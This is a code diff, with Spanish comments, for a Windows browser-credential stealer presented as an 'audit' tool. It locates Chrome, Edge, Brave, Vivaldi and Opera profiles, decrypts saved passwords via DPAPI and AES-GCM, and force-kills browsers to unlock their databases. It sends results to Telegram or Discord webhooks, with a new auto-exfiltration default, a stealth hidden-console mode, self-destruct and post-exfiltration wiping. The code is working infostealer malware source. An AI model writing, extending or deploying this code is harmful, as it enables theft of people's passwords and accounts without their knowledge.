@@ -18,7 +18,7 @@ import multiprocessing
 from pathlib import Path
 from datetime import datetime
 
-__version__ = "1.3.0"
+__version__ = "1.4.0"
 
 # =========================================================================
 # ⚙️ CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
@@ -27,10 +27,11 @@ CONFIG = {
     "tg_token":   "",  
     "tg_chat_id": "",  
     "ds_webhook": "",  
-    "stealth":    False,
-    "output_dir": ".audit",
-    "delay":      1,
-    "send_delay": 2,
+    "stealth":       False,
+    "auto_exfil":    True,
+    "output_dir":    ".audit",
+    "delay":         1,
+    "send_delay":    2,
     "webhook_timeout": 15,
     "self_destruct":   False
 }
@@ -250,63 +251,209 @@ class Exfiltrator:
         sys.exit(0)
 
 class ChromiumDecryptor:
+    # Perfiles válidos de Chromium (Default + Profile N)
+    _PROFILE_NAMES = {"Default", "Guest Profile"}
+
     def __init__(self):
         self.local   = Path(os.environ.get('LOCALAPPDATA', ''))
         self.roaming = Path(os.environ.get('APPDATA', ''))
-        self.browsers_paths = {
-            "Chrome":   self.local   / "Google/Chrome/User Data",
-            "Edge":     self.local   / "Microsoft/Edge/User Data",
-            "Brave":    self.local   / "BraveSoftware/Brave-Browser/User Data",
-            "Vivaldi":  self.local   / "Vivaldi/User Data",
-            "Opera":    self.roaming / "Opera Software/Opera Stable",
-            "Opera GX": self.roaming / "Opera Software/Opera GX Stable",
+        # Cada entrada: (nombre_display, base_path, usa_subperfiles)
+        self.browsers = {
+            "Chrome":   (self.local   / "Google/Chrome/User Data",           True),
+            "Edge":     (self.local   / "Microsoft/Edge/User Data",          True),
+            "Brave":    (self.local   / "BraveSoftware/Brave-Browser/User Data", True),
+            "Vivaldi":  (self.local   / "Vivaldi/User Data",                 True),
+            "Opera":    (self.roaming / "Opera Software/Opera Stable",       False),
+            "Opera GX": (self.roaming / "Opera Software/Opera GX Stable",   False),
         }
         self.browser_processes = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"]
 
+    # ── Infraestructura ───────────────────────────────────────────────────────
+
     def kill_browsers(self):
-        """Forcefully closes browser processes to release database locks."""
+        """Cierra forzosamente procesos de navegador para liberar bloqueos de BD."""
         import subprocess
         for proc in self.browser_processes:
             try:
                 subprocess.run(f"taskkill /F /IM {proc} /T", shell=True, capture_output=True)
-            except: pass
+            except Exception: pass
 
-    def get_key(self, path):
-        ls = path / "Local State"
-        if not ls.exists(): return None
+    # ── Obtención de Llave AES ─────────────────────────────────────────────────
+
+    def get_key(self, user_data_path: Path):
+        """
+        Extrae y descifra la master key AES del Local State.
+        Retorna (aes_key: bytes | None, dpapi_available: bool).
+        
+        - aes_key=None + dpapi_available=True  → perfil legacy, solo DPAPI
+        - aes_key=bytes + dpapi_available=True  → perfil moderno, ambos modos posibles
+        - aes_key=None + dpapi_available=False  → entorno sin soporte (sin win32crypt)
+        """
+        dpapi_available = bool(win32crypt)
+        ls = user_data_path / "Local State"
+
+        if not ls.exists():
+            logger.debug(f"Local State no encontrado en: {user_data_path}")
+            return None, dpapi_available
+
         try:
-            with open(ls, "r", encoding='utf-8') as f: config = json.load(f)
-            key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
-            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] if win32crypt else None
-        except: return None
+            with open(ls, "r", encoding="utf-8") as f:
+                config = json.load(f)
+        except Exception as e:
+            logger.warning(f"Error leyendo Local State ({user_data_path}): {e}")
+            return None, dpapi_available
 
-    def decrypt(self, blob, key):
-        if not blob or len(blob) < 3: return ""
+        encrypted_key_b64 = config.get("os_crypt", {}).get("encrypted_key")
+        if not encrypted_key_b64:
+            logger.debug(f"No hay os_crypt.encrypted_key en: {user_data_path}")
+            return None, dpapi_available
+
         try:
-            if key and len(blob) >= 32:
-                try:
-                    nonce, payload = blob[3:15], blob[15:-16]
-                    cipher = AES.new(key, AES.MODE_GCM, nonce)
-                    return cipher.decrypt(payload).decode('utf-8', errors='replace')
-                except: pass
-            if win32crypt:
-                return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode('utf-8', errors='replace')
-        except: pass
-        return "[Error]"
+            raw = base64.b64decode(encrypted_key_b64)
+            # Los primeros 5 bytes son el literal ASCII "DPAPI"
+            if not raw.startswith(b"DPAPI"):
+                logger.warning(f"Prefijo DPAPI inesperado en Local State: {user_data_path}")
+                return None, dpapi_available
 
-    def find_targets(self):
-        targets = []
-        for name, path in self.browsers_paths.items():
-            if not path.exists(): continue
-            key = self.get_key(path)
-            if not key: continue
+            encrypted = raw[5:]
+            if not win32crypt:
+                logger.debug("win32crypt no disponible, no se puede descifrar master key")
+                return None, False
+
+            aes_key = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
+            logger.debug(f"Master key AES obtenida ({len(aes_key)} bytes) para: {user_data_path}")
+            return aes_key, True
+
+        except Exception as e:
+            logger.warning(f"Error descifrando master key en {user_data_path}: {e}")
+            return None, dpapi_available
+
+    # ── Descifrado por Blob ────────────────────────────────────────────────────
+
+    def decrypt(self, blob: bytes, aes_key: bytes | None) -> str:
+        """
+        Descifra un blob individual de password_value de Chromium.
+
+        Soporta ambos esquemas simultáneamente en la misma BD:
+          - AES-GCM (v80+): prefijo b'v10' | nonce(12) | ciphertext | tag(16)
+          - DPAPI legacy  : blob DPAPI directo (sin prefijo v10)
+
+        Retorna texto plano, o un marcador descriptivo si falla.
+        Nunca retorna basura binaria.
+        """
+        if not blob:
+            return ""
+
+        # ── AES-GCM (Chromium v80+, prefijo v10 o v11) ───────────────────────
+        if blob[:3] in (b"v10", b"v11"):
+            if not aes_key:
+                logger.debug("Blob AES-GCM sin llave disponible")
+                return "[Sin Llave AES]"
+
+            if len(blob) < 3 + 12 + 16:      # mínimo viable: prefijo + nonce + tag vacío
+                logger.debug(f"Blob AES-GCM demasiado corto ({len(blob)} bytes)")
+                return "[Blob Inválido]"
+
+            nonce      = blob[3:15]
+            ciphertext = blob[15:-16]
+            tag        = blob[-16:]
+
             try:
-                profs = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
-            except: profs = []
-            if not profs: profs = [path]
-            for p in profs:
-                db = p / "Login Data"
-                if db.exists(): targets.append({"name": name, "profile": p.name, "db_path": db, "key": key})
+                cipher = AES.new(aes_key, AES.MODE_GCM, nonce)
+                plain  = cipher.decrypt_and_verify(ciphertext, tag)
+                return plain.decode("utf-8", errors="replace").strip()
+            except Exception as e:
+                logger.debug(f"AES-GCM falló (llave incorrecta o blob corrupto): {e}")
+                # El blob tiene prefijo v10 pero la llave no lo descifra.
+                # Intentamos DPAPI por si es un blob migrado a medias.
+                if win32crypt:
+                    try:
+                        raw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
+                        return raw.decode("utf-8", errors="replace").strip()
+                    except Exception:
+                        pass
+                return "[Error AES-GCM]"
+
+        # ── DPAPI Legacy (Chrome <v80, o entrada no migrada) ──────────────────
+        if win32crypt:
+            try:
+                raw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
+                return raw.decode("utf-8", errors="replace").strip()
+            except Exception as e:
+                logger.debug(f"DPAPI legacy falló: {e}")
+
+        return "[Sin Descifrar]"
+
+    # ── Descubrimiento de Perfiles ─────────────────────────────────────────────
+
+    def _scan_profiles(self, base: Path, multi_profile: bool) -> list[Path]:
+        """
+        Retorna las rutas de perfil que contienen un archivo 'Login Data'.
+        Para navegadores con multi-perfil escanea subdirectorios.
+        Para Opera/sin subdirectorio usa la raíz directamente.
+        """
+        profiles = []
+
+        if not base.exists():
+            return profiles
+
+        if multi_profile:
+            try:
+                for p in base.iterdir():
+                    if not p.is_dir():
+                        continue
+                    # Default, Guest Profile, y Profile N
+                    if p.name in self._PROFILE_NAMES or p.name.startswith("Profile "):
+                        db = p / "Login Data"
+                        if db.exists() and db.stat().st_size > 0:
+                            profiles.append(p)
+            except PermissionError as e:
+                logger.warning(f"Sin permiso para escanear {base}: {e}")
+        else:
+            # Opera y similares guardan Login Data en la raíz de User Data
+            db = base / "Login Data"
+            if db.exists() and db.stat().st_size > 0:
+                profiles.append(base)
+
+        return profiles
+
+    def find_targets(self) -> list[dict]:
+        """
+        Descubre todos los perfiles de navegador con credenciales.
+        Cada target incluye: nombre, perfil, ruta de DB, llave AES (puede ser None),
+        y si DPAPI está disponible para descifrar entradas legacy.
+        """
+        targets = []
+        for browser_name, (base_path, multi_profile) in self.browsers.items():
+            if not base_path.exists():
+                continue
+
+            # La llave AES se obtiene una vez por navegador (del Local State raíz)
+            aes_key, dpapi_ok = self.get_key(base_path)
+
+            if not aes_key and not dpapi_ok:
+                logger.info(f"[{browser_name}] Sin capacidad de descifrado, omitiendo.")
+                continue
+
+            if not aes_key:
+                logger.debug(f"[{browser_name}] Solo modo DPAPI (sin master key AES).")
+
+            profiles = self._scan_profiles(base_path, multi_profile)
+
+            if not profiles:
+                logger.debug(f"[{browser_name}] No se encontraron perfiles con Login Data.")
+                continue
+
+            for profile_path in profiles:
+                targets.append({
+                    "name":        browser_name,
+                    "profile":     profile_path.name,
+                    "db_path":     profile_path / "Login Data",
+                    "key":         aes_key,
+                    "dpapi_ok":    dpapi_ok,
+                })
+
+        logger.debug(f"Total targets encontrados: {len(targets)}")
         return targets
 
     def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None, callback=None, auto_kill=False, webhook_timeout=15):
@@ -318,12 +465,15 @@ class ChromiumDecryptor:
         targets = self.find_targets()
         if browser_filter:
             targets = [t for t in targets if browser_filter.lower() in t['name'].lower()]
-        
+
         log(f"Encontrados {len(targets)} perfiles para procesar.")
         data, filtered = [], []
+
         for t in targets:
             log(f"Auditando: {t['name']} ({t['profile']})", "info")
-            tmp = output_dir / f"tmp_{os.getpid()}.db"
+            # UUID por operación para evitar colisión si se llama en paralelo
+            import uuid
+            tmp = output_dir / f"tmp_{uuid.uuid4().hex}.db"
             conn = None
             try:
                 shutil.copy2(t['db_path'], tmp)
@@ -331,28 +481,41 @@ class ChromiumDecryptor:
                 cursor = conn.cursor()
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                 rows = cursor.fetchall()
-                log(f"  [{t['name']}] Extrayendo {len(rows)} entradas...")
+                log(f"  [{t['name']}] {len(rows)} entradas encontradas.")
+
                 for row in rows:
-                    if not (row[0] and row[1] and row[2]): continue
-                    val = self.decrypt(row[2], t['key'])
-                    entry = [t['name'], t['profile'], row[0], row[1], val]
-                    if row[0].startswith(VALID_URL_PREFIXES): data.append(entry)
-                    else: filtered.append(entry)
-            except Exception as e: log(f"Error en {t['name']}: {e}", "warning")
+                    url, user, blob = row[0], row[1], row[2]
+                    # Descarta entradas sin URL o sin usuario (no son credenciales útiles)
+                    if not url or not user:
+                        continue
+                    # Un blob vacío puede ocurrir en perfiles de Google sin contraseña guardada
+                    if not blob:
+                        continue
+
+                    pwd = self.decrypt(blob, t['key'])
+                    entry = [t['name'], t['profile'], url, user, pwd]
+
+                    if url.startswith(VALID_URL_PREFIXES):
+                        data.append(entry)
+                    else:
+                        filtered.append(entry)
+
+            except Exception as e:
+                log(f"Error procesando {t['name']}/{t['profile']}: {e}", "warning")
             finally:
-                if conn: conn.close()
+                if conn:
+                    conn.close()
                 tmp.unlink(missing_ok=True)
 
-        # --- FALLBACK INTELIGENTE ---
-        # Si no se encontró nada y auto_kill está activo, reintentamos cerrando navegadores
+        # ── Fallback: reintentar con cierre de navegadores ────────────────────
         if not data and not filtered and auto_kill:
-            log("No se detectaron datos. Reintentando con cierre forzado de navegadores...", "warning")
+            log("Sin datos. Reintentando con cierre forzado de navegadores...", "warning")
             self.kill_browsers()
             time.sleep(1.5)
-            # Llamada recursiva con auto_kill=False para evitar bucles infinitos
             return self.audit(output_dir, skip_html, skip_csv, browser_filter, callback, auto_kill=False)
 
-        if not data and not filtered: return None, None, None
+        if not data and not filtered:
+            return None, None, None
 
         stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         h_p = output_dir / f"audit_report_{stamp}.html" if not skip_html else None
@@ -398,10 +561,11 @@ def main():
     en.add_argument("--browser", help="Filtro de navegador (ej: brave, chrome)")
     en.add_argument("--delay", type=int, default=CONFIG["delay"])
     en.add_argument("--clean", action="store_true")
-    en.add_argument("--stealth", action="store_true", default=CONFIG["stealth"])
+    en.add_argument("--stealth", action="store_true", default=CONFIG["stealth"],
+                    help="Oculta la ventana de consola inmediatamente al arrancar usando ShowWindow (Modo Sigilo).")
     en.add_argument("--auto-kill", action="store_true", help="Cerrar navegadores automáticamente si falla la lectura")
     en.add_argument("--no-wipe", action="store_true", help="No eliminar archivos locales tras exfiltrar")
-    en.add_argument("--self-destruct", action="store_true", help="Eliminar el ejecutable tras finalizar")
+    en.add_argument("--self-destruct", action="store_true", default=CONFIG["self_destruct"], help="Eliminar el ejecutable tras finalizar")
     en.add_argument("--debug", action="store_true", help="Activar logs detallados")
     
     args = parser.parse_args()
@@ -433,7 +597,8 @@ def main():
         jp = out / f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         with open(jp, 'w', encoding='utf-8') as f: json.dump(results, f, indent=4, ensure_ascii=False)
     
-    if results and not args.no_exfil:
+    # auto_exfil puede ser desactivado desde el CONFIG embebido (Builder) o con --no-exfil
+    if results and not args.no_exfil and CONFIG["auto_exfil"]:
         exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=args.delay or 15)
         files = [p for p in (hp, cp) if p and p.exists()]
         if files:
